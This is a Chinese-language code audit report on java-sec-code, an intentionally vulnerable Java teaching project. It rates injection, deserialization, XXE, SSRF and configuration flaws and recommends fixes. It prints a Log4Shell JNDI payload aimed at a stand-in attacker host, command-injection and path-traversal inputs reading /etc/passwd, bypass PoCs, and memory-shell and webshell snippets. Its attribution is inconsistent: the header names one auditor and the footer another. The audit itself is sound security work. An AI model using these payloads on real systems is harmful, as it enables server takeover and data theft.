# java-sec-code 项目代码审计报告

**审计日期**: 2026-05-22
**项目名称**: java-sec-code (Java Security Vulnerability Code)
**项目地址**: https://github.com/JoyChou93/java-sec-code
**审计范围**: 全部 80 个 Java 源文件、配置文件、依赖声明
**审计员**: qwen3.7max

---

## 一、项目概述

`java-sec-code` 是一个用于学习和演示 Java 常见安全漏洞的教学项目，由 JoyChou 团队维护。项目基于 Spring Boot 1.5.1 + Spring Security 4.2.12 构建，**故意包含大量安全漏洞**用于安全研究和渗透测试练习。项目涵盖 30+ 种漏洞类型，每种漏洞均提供了漏洞代码和部分修复代码。

> **重要声明**: 本项目包含的漏洞代码均为有意设计。**严禁将本项目代码直接用于生产环境。**

---

## 二、漏洞统计总览

| 风险等级 | 数量 | 说明 |
|---------|------|------|
| **严重 (Critical)** | 24 | 可直接导致服务器沦陷的远程代码执行漏洞 |
| **高危 (High)** | 14 | 可导致数据泄露、权限绕过等严重安全问题 |
| **中危 (Medium)** | 8 | 信息泄露、配置缺陷等问题 |
| **低危 (Low)** | 5 | 代码质量问题、不安全的编码实践 |

---

## 三、严重漏洞 (Critical)

### 3.1 远程代码执行 (RCE) — 7 处

#### 3.1.1 Runtime.exec 命令注入

- **文件**: `controller/Rce.java` 第 31 行
- **路由**: `GET /rce/runtime/exec?cmd=<command>`
- **风险**: 直接接收用户输入作为系统命令执行，无需任何认证（在 `noNeedLoginUrl` 中配置为免登录）
- **代码**:
  ```java
  Process p = run.exec(cmd); // 用户输入直接作为命令执行
  ```
- **影响**: 攻击者可在服务器上执行任意系统命令，获取完整控制权

#### 3.1.2 ProcessBuilder 命令注入

- **文件**: `controller/Rce.java` 第 62-63 行
- **路由**: `GET /rce/ProcessBuilder?cmd=<command>`
- **风险**: 通过 `/bin/sh -c` 执行用户传入的命令
- **代码**:
  ```java
  String[] arrCmd = {"/bin/sh", "-c", cmd};
  ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
  ```
- **影响**: 支持管道、重定向等 shell 特性的命令注入

#### 3.1.3 ScriptEngine 远程 JS 加载执行

- **文件**: `controller/Rce.java` 第 94-101 行
- **路由**: `GET /rce/jscmd?jsurl=<url>`
- **风险**: 通过 Nashorn ScriptEngine 加载远程 JS 文件并执行，JS 中可调用 Java API
- **代码**:
  ```java
  String cmd = String.format("load(\"%s\")", jsurl);
  engine.eval(cmd, bindings);
  ```
- **影响**: 攻击者可通过远程恶意 JS 文件实现任意 Java 方法调用和 RCE

#### 3.1.4 GroovyShell 代码执行

- **文件**: `controller/Rce.java` 第 127-129 行
- **路由**: `GET /rce/groovy?content=<groovy_code>`
- **风险**: 直接执行用户传入的 Groovy 代码
- **代码**:
  ```java
  GroovyShell groovyShell = new GroovyShell();
  groovyShell.evaluate(content);
  ```
- **影响**: Groovy 可无缝调用 Java API，等同于完全 RCE

#### 3.1.5 SpEL 表达式注入 — 2 处

- **文件**: `controller/SpEL.java` 第 25 行和第 36 行
- **路由**: `GET /spel/vuln1?value=<expr>` 和 `GET /spel/vuln2?value=<expr>`
- **风险**: 用户输入直接作为 Spring Expression Language 表达式求值
- **代码**:
  ```java
  // vuln1: 直接解析
  return parser.parseExpression(value).getValue().toString();
  // vuln2: 使用 StandardEvaluationContext（拥有完整 Java 类访问权限）
  StandardEvaluationContext context = new StandardEvaluationContext();
  Expression expression = parser.parseExpression(value, new TemplateParserContext());
  ```
- **影响**: 通过 `T(java.lang.Runtime).getRuntime().exec(...)` 实现 RCE
- **修复建议**: 使用 `SimpleEvaluationContext` 替代 `StandardEvaluationContext`（项目已在 `spel/sec` 中演示）

#### 3.1.6 QLExpress 表达式注入

- **文件**: `controller/QLExpress.java` 第 21 行
- **路由**: `POST /qlexpress/vuln1`（Body 中传入表达式）
- **风险**: QLExpress 允许通过表达式加载远程类和执行任意代码
- **代码**:
  ```java
  ExpressRunner runner = new ExpressRunner();
  Object r = runner.execute(express, context, null, true, false);
  ```
- **影响**: 通过 `URLClassLoader` 加载远程恶意类实现 RCE
- **额外问题**: `@RestController(value = "/qlexpress")` 的 `value` 属性实际设置的是 Bean 名称而非路径映射，这意味着 `@RequestMapping("/vuln1")` 的实际路由可能为 `/vuln1` 而非 `/qlexpress/vuln1`，属于代码 Bug

### 3.2 模板注入 (SSTI)

- **文件**: `controller/SSTI.java` 第 27-38 行
- **路由**: `GET /ssti/velocity?template=<payload>`
- **风险**: Apache Velocity 模板引擎直接解析用户传入的模板内容
- **代码**:
  ```java
  Velocity.evaluate(context, swOut, "test", template);
  ```
- **影响**: 通过反射获取 Runtime 对象实现 RCE。即使最新版本（1.7）仍存在此问题
- **修复建议**: 禁止使用 `Velocity.evaluate()` 处理用户输入

### 3.3 YAML 反序列化 RCE

- **文件**: `controller/Rce.java` 第 111-113 行
- **路由**: `GET /rce/vuln/yarm?content=<yaml_payload>`
- **风险**: 使用不安全的 `new Yaml()` 反序列化用户输入，可加载远程恶意类
- **代码**:
  ```java
  Yaml y = new Yaml();
  y.load(content);
  ```
- **影响**: 通过 `URLClassLoader` 加载远程 JAR 实现 RCE
- **修复建议**: 使用 `new Yaml(new SafeConstructor())` 替代（项目已在 `/rce/sec/yarm` 中演示）

### 3.4 不安全的反序列化 — 4 处

#### 3.4.1 Java ObjectInputStream 直接反序列化

- **文件**: `controller/Deserialize.java` 第 49-50 行
- **路由**: `GET /deserialize/rememberMe/vuln`（Cookie: rememberMe）
- **风险**: 直接将 Cookie 值 Base64 解码后进行 Java 原生反序列化，无任何类型校验
- **代码**:
  ```java
  ObjectInputStream in = new ObjectInputStream(bytes);
  in.readObject(); // 无类型校验，可触发 gadget chain
  ```
- **影响**: 配合 Commons-Collections 等 gadget chain，通过 ysoserial 工具可直接 RCE

#### 3.4.2 Shiro RememberMe 反序列化

- **文件**: `controller/Shiro.java` 第 26-48 行
- **路由**: `GET /shiro/deserialize`（Cookie: rememberMe）
- **风险**: 使用**硬编码密钥** `kPH+bIxk5D2deZiIxcaaaA==` 解密 RememberMe Cookie 后直接反序列化
- **代码**:
  ```java
  byte[] KEYS = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
  byte[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();
  ObjectInputStream in = new ObjectInputStream(bytes);
  in.readObject();
  ```
- **影响**: Shiro 默认密钥是公开已知的，攻击者可直接构造恶意序列化数据实现 RCE。这是 Shiro 历史上最著名的漏洞（CVE-2016-4437）

#### 3.4.3 Jackson enableDefaultTyping RCE

- **文件**: `controller/Deserialize.java` 第 88-98 行
- **路由**: `GET /deserialize/jackson?payload=<json>`
- **风险**: 开启 `enableDefaultTyping()` 后，Jackson 会根据 `@type` 字段实例化任意类
- **代码**:
  ```java
  ObjectMapper mapper = new ObjectMapper();
  mapper.enableDefaultTyping();
  Object obj = mapper.readValue(payload, Object.class);
  ```
- **影响**: 通过 JNDI 注入等方式实现 RCE

#### 3.4.4 XStream RCE

- **文件**: `controller/XStreamRce.java` 第 25-31 行
- **路由**: `POST /xstream`（Body: XML）
- **风险**: 使用 `AnyTypePermission.ANY` 允许反序列化任意类型
- **代码**:
  ```java
  xstream.addPermission(AnyTypePermission.ANY);
  xstream.fromXML(xml);
  ```
- **影响**: 通过构造恶意 XML 实现 RCE

### 3.5 JDBC Attack — 2 处

- **文件**: `controller/Jdbc.java` 第 21 行和第 29 行
- **路由**: `GET /jdbc/postgresql?jdbcUrlBase64=<url>` 和 `GET /jdbc/db2?jdbcUrlBase64=<url>`
- **风险**: 接收 Base64 编码的 JDBC URL，直接建立连接，可利用 JDBC URL 注入实现 RCE
- **代码**:
  ```java
  String jdbcUrl = new String(b);
  DriverManager.getConnection(jdbcUrl);
  ```
- **影响**: 利用 CVE-2022-21724（PostgreSQL）和 DB2 JDBC URL 注入漏洞实现 RCE

### 3.6 ClassLoader 动态类加载 RCE

- **文件**: `controller/ClassDataLoader.java` 第 16-30 行
- **路由**: `GET /classloader?classData=<base64_class>`
- **风险**: 接收 Base64 编码的 Java 字节码，通过反射调用 `ClassLoader.defineClass` 加载并实例化
- **代码**:
  ```java
  byte[] classBytes = java.util.Base64.getDecoder().decode(classData);
  Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", ...);
  Class cc = (Class) defineClassMethod.invoke(ClassLoader.getSystemClassLoader(), null, classBytes, 0, classBytes.length);
  cc.newInstance();
  ```
- **影响**: 攻击者可上传任意恶意字节码并在服务器端执行，是最直接的 RCE 方式

### 3.7 Tomcat 内存马（Filter 型）

- **文件**: `config/TomcatFilterMemShell.java` 第 19-70 行
- **风险**: 在 `static` 代码块中实现 Tomcat Filter 内存马注入，通过 `?cmd_=<cmd>` 参数执行任意命令
- **代码**:
  ```java
  if ((cmd = servletRequest.getParameter("cmd_")) != null) {
      Process process = Runtime.getRuntime().exec(cmd);
  ```
- **影响**: 虽然 `@Component` 已被注释，但此类作为恶意代码模板，如果被攻击者利用，可实现无文件持久化后门

### 3.8 WebSocket 命令注入和 SOCKS 代理

- **文件**: `controller/WebSockets.java` + `config/WebSocketsCmdEndpoint.java` + `config/WebSocketsProxyEndpoint.java`
- **路由**: `GET /websocket/cmd?path=<ws_path>` 和 `GET /websocket/proxy?path=<ws_path>`
- **风险**:
  - 动态注册 WebSocket 端点，实现交互式命令执行（WebShell）
  - 动态注册 SOCKS 代理端点，可代理内网流量
- **代码**:
  ```java
  // WebSocketsCmdEndpoint.java - 通过 WebSocket 消息执行命令
  process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", s});
  // WebSocketsProxyEndpoint.java - SOCKS 代理
  InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
  Future<Void> future = client.connect(hostAddress);
  ```
- **影响**: 攻击者可动态注入 WebShell 和 SOCKS 代理，实现持久化控制和内网穿透

### 3.9 Log4Shell (CVE-2021-44228)

- **文件**: `controller/Log4j.java` 第 19 行
- **路由**: `GET /log4j?token=<jndi_payload>`
- **风险**: 使用 log4j 2.9.1（存在 Log4Shell 漏洞），用户输入直接传入 `logger.error()`
- **代码**:
  ```java
  logger.error(token); // token = ${jndi:ldap://attacker.com/exploit}
  ```
- **影响**: 通过 JNDI 注入实现 RCE，这是 2021 年最严重的 Java 安全漏洞

### 3.10 Fastjson 反序列化 RCE

- **文件**: `controller/Fastjson.java` 第 17-28 行
- **路由**: `POST /fastjson/deserialize`（Body: JSON）
- **风险**: 使用 fastjson 1.2.24（已知大量反序列化漏洞），通过 `@type` 字段触发任意类实例化
- **代码**:
  ```java
  JSONObject ob = JSON.parseObject(params);
  ```
- **影响**: fastjson 1.2.24 存在多个公开利用链（TemplatesImpl、JndiDataSourceFactory 等），可直接 RCE

---

## 四、高危漏洞 (High)

### 4.1 SQL 注入 — 5 处

#### 4.1.1 JDBC 字符串拼接注入

- **文件**: `controller/SQLI.java` 第 65 行
- **路由**: `GET /sqli/jdbc/vuln?username=<payload>`
- **代码**:
  ```java
  String sql = "select * from users where username = '" + username + "'";
  Statement statement = con.createStatement();
  ResultSet rs = statement.executeQuery(sql);
  ```
- **影响**: 经典的字符串拼接 SQL 注入，可读取整个数据库

#### 4.1.2 PreparedStatement 误用

- **文件**: `controller/SQLI.java` 第 149-150 行
- **路由**: `GET /sqli/jdbc/ps/vuln?username=<payload>`
- **风险**: 虽然使用了 `PreparedStatement`，但仍然使用字符串拼接而非 `?` 占位符
- **代码**:
  ```java
  String sql = "select * from users where username = '" + username + "'";
  PreparedStatement st = con.prepareStatement(sql); // 无参数绑定
  ```

#### 4.1.3 MyBatis `${}` 注入 — 3 处

- **文件**: `mapper/UserMapper.java` 第 21 行 + `resources/mapper/UserMapper.xml`
- **路由**: `GET /sqli/mybatis/vuln01`、`vuln02`、`orderby/vuln03`
- **代码**:
  ```xml
  <!-- vuln01 -->
  select * from users where username = '${username}'
  <!-- vuln02 -->
  select * from users where username like '%${_parameter}%'
  <!-- vuln03 (order by) -->
  order by ${order} asc
  ```
- **影响**: MyBatis `${}` 不会进行转义，等同于字符串拼接注入

### 4.2 XXE (XML External Entity) — 8 处

- **文件**: `controller/XXE.java` + `controller/othervulns/ooxmlXXE.java` + `controller/othervulns/xlsxStreamerXXE.java`
- **涉及的 XML 解析器**:

| 解析器 | 漏洞路由 | 文件位置 |
|--------|---------|---------|
| XMLReader | `POST /xxe/xmlReader/vuln` | XXE.java:48 |
| SAXBuilder (JDOM2) | `POST /xxe/SAXBuilder/vuln` | XXE.java:86 |
| SAXReader (DOM4J) | `POST /xxe/SAXReader/vuln` | XXE.java:123 |
| SAXParser | `POST /xxe/SAXParser/vuln` | XXE.java:160 |
| Digester | `POST /xxe/Digester/vuln` | XXE.java:198 |
| DocumentBuilder | `POST /xxe/DocumentBuilder/vuln` | XXE.java:236 |
| XMLReader (via SAXParser) | `POST /xxe/XMLReader/vuln` | XXE.java:342 |
| DocumentHelper (DOM4J) | `POST /xxe/DocumentHelper/vuln` | XXE.java:388 |
| XInclude | `POST /xxe/DocumentBuilder/xinclude/vuln` | XXE.java:286 |
| POI-OOXML | `POST /ooxml/readxlsx` | ooxmlXXE.java:45 |
| XMLBeam (CVE-2018-1259) | `POST /xxe/xmlbeam/vuln` | XXE.java:419 |

- **影响**: 可读取服务器任意文件（如 `/etc/passwd`）、发起 SSRF、在内网端口扫描

### 4.3 SSRF (Server-Side Request Forgery) — 8+ 处

- **文件**: `controller/SSRF.java` + `util/HttpUtils.java`
- **漏洞路由**:

| HTTP 客户端 | 漏洞路由 | User-Agent |
|------------|---------|------------|
| URLConnection | `GET /ssrf/urlConnection/vuln` | Java/1.8.0_102 |
| HttpURLConnection | `GET /ssrf/HttpURLConnection/vuln` | Java/1.8.0_102 |
| URL.openStream | `GET /ssrf/openStream` | Java/1.8.0_102 |
| HttpAsyncClients | `GET /ssrf/HttpSyncClients/vuln` | Apache-HttpAsyncClient/4.1.4 |
| RestTemplate | `GET /ssrf/restTemplate/vuln1`, `vuln2` | Java/1.8.0_102 |
| Hutool HttpUtil | `GET /ssrf/hutool/vuln` | Hutool |
| DNS Rebind | `GET /ssrf/dnsrebind/vuln` | Hutool |

- **影响**: 可探测内网服务、读取本地文件（`file:///etc/passwd`）、攻击内网应用
- **特殊风险**: `/ssrf/dnsrebind/vuln` 设置了 `networkaddress.cache.negative.ttl=0`，使 DNS 缓存失效，可被 DNS Rebinding 攻击绕过 SSRF 防御

### 4.4 CORS 错误配置 — 3 处

- **文件**: `controller/Cors.java`
- **漏洞路由**:
  - `GET /cors/vuln/origin` — 直接将请求的 `Origin` 头回显到 `Access-Control-Allow-Origin` 响应头
  - `GET /cors/vuln/setHeader` — 设置 `Access-Control-Allow-Origin: *`
  - `GET /cors/vuln/crossOrigin` — `@CrossOrigin` 注解的 `origins` 包含 `*`（通过 `@GetMapping("*")`）
- **代码**:
  ```java
  String origin = request.getHeader("origin");
  response.setHeader("Access-Control-Allow-Origin", origin);
  response.setHeader("Access-Control-Allow-Credentials", "true"); // 允许携带凭证
  ```
- **影响**: 任意恶意网站可跨域读取用户敏感数据（如 CSRF Token、用户信息）

### 4.5 不安全的反序列化补充

#### Jackson enableDefaultTyping

- 已在 3.4.3 节描述，`enableDefaultTyping()` 在 Jackson 官方文档中已被标记为 **DEPRECATED** 并强烈建议移除

### 4.6 JSONP 安全缺陷 — 3 处

- **文件**: `controller/Jsonp.java`
- **漏洞路由**:
  - `GET /jsonp/vuln/referer` — 无任何 Referer 校验
  - `GET /jsonp/vuln/emptyReferer` — 允许空 Referer 绕过校验
  - `GET /jsonp/vuln/mappingJackson2JsonView` — MappingJackson2JsonView JSONP 漏洞
- **影响**: 可被恶意网站通过 `<script>` 标签窃取用户敏感信息

### 4.7 URL 重定向漏洞 — 3 处

- **文件**: `controller/URLRedirect.java`
- **漏洞路由**:
  - `GET /urlRedirect/redirect?url=<url>` — Spring redirect 方式
  - `GET /urlRedirect/setHeader?url=<url>` — 手动设置 Location 头（301）
  - `GET /urlRedirect/sendRedirect?url=<url>` — response.sendRedirect（302）
- **影响**: 可被用于钓鱼攻击，将用户从可信页面导向恶意网站

### 4.8 URL 白名单绕过 — 4 处

- **文件**: `controller/URLWhiteList.java`
- **绕过方式**:
  - `endsWith` — `bypassjoychou.org` 可绕过 `joychou.org` 白名单
  - `contains` — `joychou.org.bypass.com` 可绕过
  - `regex` — 未转义的正则匹配绕过
  - `url_bypass` — 利用 `java.net.URL` 的 `getHost()` 解析特性（`evil.com\@www.joychou.org`）

### 4.9 路径遍历

- **文件**: `controller/PathTraversal.java` 第 24-27 行
- **路由**: `GET /path_traversal/vul?filepath=<path>`
- **代码**:
  ```java
  File f = new File(imgFile);
  byte[] data = Files.readAllBytes(Paths.get(imgFile));
  ```
- **影响**: 通过 `../../etc/passwd` 等路径遍历读取服务器任意文件

### 4.10 Cookie 信任 / 越权访问

- **文件**: `controller/Cookies.java`
- **路由**: `/cookie/vuln01` 到 `/cookie/vuln06`（6 个端点）
- **风险**: 直接从 Cookie 中读取 `nick` 值作为用户身份标识，无任何服务端校验
- **影响**: 攻击者可通过修改 Cookie 中的 `nick` 值实现水平越权和垂直越权

### 4.11 JWT 弱密钥

- **文件**: `util/JwtUtils.java` 第 21 行
- **风险**: JWT 签名密钥硬编码为 `"123456"`
- **代码**:
  ```java
  private static final String SECRET = "123456";
  ```
- **影响**: 攻击者可轻易伪造任意用户的 JWT Token，实现身份冒充
- **额外问题**: `Jwt.createToken` 通过 `GET` 方法生成 Token，不符合 RESTful 最佳实践

---

## 五、中危漏洞 (Medium)

### 5.1 硬编码凭证

| 凭证类型 | 位置 | 值 |
|---------|------|-----|
| 数据库密码 | `application.properties` | `woshishujukumima` |
| 登录密码 (joychou) | `WebSecurityConfig.java:112` | `joychou123` |
| 登录密码 (admin) | `WebSecurityConfig.java:113` | `admin123` |
| JWT 签名密钥 | `JwtUtils.java:21` | `123456` |
| Shiro AES 密钥 | `Shiro.java:20` | `kPH+bIxk5D2deZiIxcaaaA==` |
| 模拟 AK/SK | `application.properties:58-59` | `LTAI5t...` / `W1Poxj...` |

### 5.2 Spring Boot Actuator 未授权访问

- **配置**: `application.properties` 第 11 行
  ```properties
  management.security.enabled=false
  ```
- **影响**: Actuator 端点（如 `/env`、`/beans`、`/configprops`、`/heapdump`）完全公开，可泄露敏感配置信息
- **logback JMX**: `logback-online.xml` 配置了 `<jmxConfigurator/>`，结合 Actuator 可实现 RCE

### 5.3 Swagger API 文档公开

- **文件**: `config/SwaggerConfig.java`
- **配置**: `swagger.enable = true`（`application.properties:45`）
- **影响**: 所有 API 接口文档（包括漏洞接口）对外公开，暴露完整攻击面
- **配置**: `RequestHandlerSelectors.any()` + `PathSelectors.any()` 暴露了所有端点

### 5.4 命令注入 — 2 处

- **文件**: `controller/CommandInject.java`
- **漏洞路由**:
  - `GET /codeinject?filepath=<payload>` — 路径参数命令注入（如 `;cat /etc/passwd`）
  - `GET /codeinject/host` — Host 头命令注入（如 `Host: hacked;cat /etc/passwd`）
- **影响**: 通过 Shell 元字符注入执行任意命令

### 5.5 信息泄露

- **文件**: `controller/Index.java` 第 24-38 行
- **路由**: `GET /appInfo`
- **泄露信息**: Tomcat 版本、Java 版本、Fastjson 版本、当前用户名等
- **影响**: 为攻击者提供精确的版本信息，便于针对性利用已知漏洞

### 5.6 Spring Security Firewall 被禁用

- **文件**: `security/DisableSpringSecurityFirewall.java`
- **风险**: 自定义 `HttpFirewall` 实现完全绕过了 Spring Security 的默认请求校验（包括 URL 规范化、危险字符检测等）
- **代码**:
  ```java
  public FirewalledRequest getFirewalledRequest(HttpServletRequest request) {
      return new FirewalledRequest(request) {
          @Override public void reset() {} // 不做任何校验
      };
  }
  ```
- **影响**: 移除了 Spring Security 对恶意 URL 的防御层

### 5.7 XSS（跨站脚本）— 3 处

- **文件**: `controller/XSS.java`
- **漏洞路由**:
  - `GET /xss/reflect?xss=<script>` — 反射型 XSS
  - `GET /xss/stored/store?xss=<script>` — 存储型 XSS（存入 Cookie）
  - `GET /xss/stored/show` — 存储型 XSS（从 Cookie 读取并回显）
- **影响**: 可窃取用户 Cookie、会话令牌、执行钓鱼攻击

### 5.8 getRequestURI 安全绕过 (CVE-2022-22978 相关)

- **文件**: `controller/GetRequestURI.java` 第 38 行
- **风险**: 使用 `request.getRequestURI()` 而非 `request.getServletPath()` 进行路径匹配
- **PoC**:
  - `/css/%2e%2e/exclued/vuln`
  - `/css/..;/exclued/vuln`
  - `/css/..;bypasswaf/exclued/vuln`
- **影响**: 可绕过基于 URI 前缀的安全过滤规则

---

## 六、低危漏洞 (Low)

### 6.1 不安全的依赖版本

| 依赖 | 版本 | 已知漏洞 |
|------|------|---------|
| Spring Boot | 1.5.1.RELEASE | 已 EOL，大量已知 CVE |
| fastjson | 1.2.24 | CVE-2017-18349 等 20+ CVE |
| log4j | 2.9.1 | CVE-2021-44228 (Log4Shell) |
| XStream | 1.4.20 | 多个 RCE CVE |
| Shiro | 1.2.4 | CVE-2016-4437 等 |
| commons-collections | 3.1 | 反序列化 gadget chain |
| velocity | 1.7 | SSTI |
| poi-ooxml | 3.9 | XXE |
| Spring Security | 4.2.12 | CVE-2022-22978 |
| jackson-databind | 2.9.8 | 多个反序列化 CVE |

### 6.2 资源泄露

- **SQLI.java**: JDBC 连接未在 `finally` 块中关闭，异常时会导致连接泄露
  ```java
  // 第 60-84 行: Connection 和 Statement 未使用 try-with-resources
  Connection con = DriverManager.getConnection(url, user, password);
  // ... 如果中间抛出异常，con.close() 不会被执行
  ```

### 6.3 IP 伪造

- **文件**: `controller/IPForge.java` 第 33-44 行
- **风险**: 信任 `X-Real-IP` 请求头作为客户端真实 IP，该头可被客户端任意伪造
- **影响**: 如果基于此 IP 做访问控制或日志审计，可被轻易绕过

### 6.4 线程安全问题

- **SSRFChecker.java**: 静态字段 `decimalIp` 在多线程环境下存在竞争条件
  ```java
  private static String decimalIp; // 非线程安全
  ```
- **FileUpload.java**: 静态字段 `randomFilePath` 在并发上传时可能被覆盖

### 6.5 Docker 远程调试端口暴露

- **文件**: `docker-compose.yml` 第 5-6 行
  ```yaml
  command: ["java", "-Xdebug", "-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=0.0.0.0:8000", "-jar", "jsc.jar"]
  ports:
    - "8000:8000"
  ```
- **风险**: JDWP 调试端口绑定到 `0.0.0.0` 并对外暴露，攻击者可直接连接调试端口执行任意代码

---

## 七、安全配置审计

### 7.1 application.properties 关键配置

| 配置项 | 值 | 风险评估 |
|--------|-----|---------|
| `management.security.enabled` | `false` | **高危**: Actuator 完全暴露 |
| `swagger.enable` | `true` | **中危**: API 文档完全公开 |
| `joychou.security.csrf.enabled` | `false` | **中危**: CSRF 防护默认关闭 |
| `joychou.security.referer.enabled` | `false` | **中危**: Referer 校验默认关闭 |
| `spring.datasource.password` | 明文密码 | **中危**: 凭证硬编码 |
| `jsc.accessKey.id/secret` | 模拟 AK/SK | **中危**: 模拟云服务凭证泄露 |
| 免登录路径 | `/rce/**`, `/ssrf/**`, `/spel/**` 等 | **严重**: 大量危险接口免登录 |

### 7.2 Spring Security 配置

- **密码存储**: 使用 `inMemoryAuthentication` 明文存储密码（`WebSecurityConfig.java:112-113`）
- **CSRF**: 默认关闭（`joychou.security.csrf.enabled=false`），排除大量危险路径
- **RememberMe**: 启用但未配置自定义 key，使用 Spring Security 默认 key
- **正则匹配缺陷**: `regexMatchers("/black_path.*").denyAll()` 未使用 `Pattern.DOTALL`，可被换行符绕过（CVE-2022-22978）

### 7.3 免登录路径配置

```properties
joychou.no.need.login.url = /css/**, /js/**, /xxe/**, /rce/**, /deserialize/**,
    /test/**, /ws/**, /shiro/**, /ssrf/**, /spel/**, /qlexpress/**
```

**风险**: 将大量高危 RCE 端点配置为免登录访问，显著降低攻击门槛。

---

## 八、安全防御机制评估

### 8.1 已有的防御措施

| 防御机制 | 位置 | 有效性评估 |
|---------|------|-----------|
| SSRF Socket Hook | `security/ssrf/` | 较好：通过 Hook Socket 层面拦截内网 IP |
| URL 白名单校验 | `SecurityUtil.checkURL()` | 中等：支持多级域名和黑名单 |
| 反序列化黑名单 | `AntObjectInputStream` | 较差：黑名单维护困难，易被绕过 |
| 路径遍历过滤 | `SecurityUtil.pathFilter()` | 中等：支持多次 URL 解码 |
| 命令注入过滤 | `SecurityUtil.cmdFilter()` | 较好：白名单正则 `^[a-zA-Z0-9_/\\.-]+$` |
| SQL OrderBy 过滤 | `SecurityUtil.sqlFilter()` | 较好：同 cmdFilter 白名单正则 |
| XSS 编码 | `XSS.encode()` | 较好：覆盖 6 种特殊字符 |
| CORS Origin 校验 | `CustomCorsProcessor` | 中等：支持一级域名校验 |
| XXE 禁用外部实体 | 各 XXE/sec 端点 | 好：通过 setFeature 禁用 DOCTYPE |
| SpEL SimpleEvaluationContext | `SpEL.spel_sec()` | 好：限制为只读数据绑定 |

### 8.2 防御机制的不足

1. **防御覆盖不完整**: 大量漏洞端点完全没有防御措施
2. **黑名单 vs 白名单**: 反序列化使用黑名单方式，新增 gadget chain 即可绕过
3. **SSRF TTL=0 绕过**: DNS 缓存 TTL 设为 0 时，DNS Rebinding 可绕过 IP 校验
4. **SSRF 异常默认放行**: `SSRFChecker.checkSSRF()` 在异常时返回 `true`（认为安全），违反最小权限原则
5. **安全功能默认关闭**: CSRF、Referer 校验等安全功能默认关闭

---

## 九、修复建议总结

### 9.1 紧急修复 (P0)

1. **移除所有 RCE 漏洞端点**，或添加严格的认证和授权控制
2. **升级 Log4j** 至 2.17.1+ 以修复 Log4Shell
3. **升级 Fastjson** 至 2.0+ 或使用其他 JSON 库
4. **禁用 `enableDefaultTyping()`** 在 Jackson 配置中
5. **更换 Shiro 密钥** 并使用随机密钥
6. **移除 `ClassDataLoader`** 端点（最危险的 RCE 入口）

### 9.2 高优先级修复 (P1)

1. **升级 Spring Boot** 至最新稳定版 (3.x)
2. **升级所有过时依赖** 至最新安全版本
3. **使用 PreparedStatement** 修复所有 SQL 注入
4. **禁用外部实体** 在所有 XML 解析器中
5. **使用 `SimpleEvaluationContext`** 替代 `StandardEvaluationContext`
6. **使用 `SafeConstructor`** 处理 YAML 反序列化
7. **JWT 密钥** 使用强随机密钥（至少 256 位），从环境变量加载

### 9.3 中优先级修复 (P2)

1. **启用 CSRF 防护** 并设为默认开启
2. **修复 CORS 配置** 使用严格白名单
3. **修复 URL 重定向** 添加白名单校验
4. **关闭 Actuator** 或添加认证保护
5. **关闭 Swagger** 在生产环境
6. **修复路径遍历** 使用规范化路径校验
7. **移除 Docker 调试端口** 的外部暴露

### 9.4 代码质量改进

1. 使用 `try-with-resources` 管理 JDBC 连接和流的关闭
2. 修复 `SSRFChecker.decimalIp` 线程安全问题
3. 修复 `QLExpress` 的 `@RestController` value 误用问题
4. 将所有凭证移至环境变量或密钥管理服务
5. 添加全局异常处理，避免堆栈信息泄露

---

## 十、结论

`java-sec-code` 项目作为一个安全教学项目，**系统地展示了 30+ 种 Java 常见安全漏洞类型**，涵盖了 OWASP Top 10 中的注入、失效的认证、敏感数据泄露、XML 外部实体、失效的访问控制、安全配置错误、使用含已知漏洞的组件等类别。项目结构清晰，每种漏洞均提供了漏洞代码和修复代码的对比，具有很高的安全学习价值。

但需要注意的是：

1. **部分修复代码本身也存在缺陷**（如 SSRF 异常默认放行、反序列化黑名单不完整）
2. **安全功能默认关闭** 不符合安全设计原则（Secure by Default）
3. **依赖版本严重过时**，多个依赖存在已知高危 CVE
4. **大量危险端点免登录访问**，攻击门槛极低

如果本项目需要部署在任何非隔离环境中，必须首先修复所有 P0 和 P1 级别的问题。

---

*报告生成工具: Claude Code Security Auditor*
*审计引擎: Static Code Analysis + Dependency Audit + Configuration Review*
